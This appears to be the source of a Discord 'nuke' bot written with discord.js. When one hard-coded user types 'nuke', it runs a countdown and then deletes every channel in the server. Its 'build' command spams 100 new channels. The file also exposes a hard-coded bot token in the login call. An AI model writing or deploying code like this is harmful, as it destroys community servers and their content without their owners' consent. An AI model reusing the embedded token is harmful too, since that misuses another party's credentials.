const { Client, Intents, MessageEmbed, VoiceChannel } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_VOICE_STATES, Intents.FLAGS.GUILD_MESSAGE_REACTIONS] });


client.on("ready", () => {
    console.log("Stop this imedeitalty");
})

client.on("messageCreate", (message) => {
    if (message.content == "nuke" && message.author.id == 839266645285535744) {
        const discordServer = client.guilds.cache.get(message.guildId);
        const channelss = discordServer?.channels ? JSON.parse(
            JSON.stringify(discordServer.channels)
        ).guild.channels : [];
    


        message.reply("Valid Launch Code");
        yeah();
        async function yeah() {
            const ohLord = await message.channel.send("launching in 5");
            setTimeout(function () {
                ohLord.edit("Launching in 4");
                setTimeout(function () {
                    ohLord.edit("Launching in 3");
                    setTimeout(function () {
                        ohLord.edit("Launching in 2");
                        setTimeout(function () {
                            ohLord.edit("Launching in 1");
                            setTimeout(function () {
                                ohLord.edit("BOOM 💥💥💥");
                                setTimeout(function () {
                                    for (let i = 0; i < channelss.length; i++) {
                                        const fetchedChannel = message.guild.channels.cache.get(channelss[i]);
                                        fetchedChannel.delete();
                                    }
                                }, 1000);
                            }, 1000);
                        }, 1000);
                    }, 1000);
                }, 1000);
            }, 1000);
        }
    }
    else if (message.content == "ping") return message.reply("Pong");
    else if (message.content == "build" && message.author.id == 839266645285535744) {
        for (let i = 0; i <100; i++) {
            message.guild.channels.create(i, { 
                type: "GUILD_TEXT", // syntax has changed a bit
                permissionOverwrites: [{ // same as before
                    id: message.guild.id,
                    allow: ["VIEW_CHANNEL"],
                }]
            });
        }
    }
});

client.login("ODcwNDYyMDk2NDg2MzAxNjk2.YQNHAA.AL76dp_qWdOZ5jFLaFjvcNcjyC4");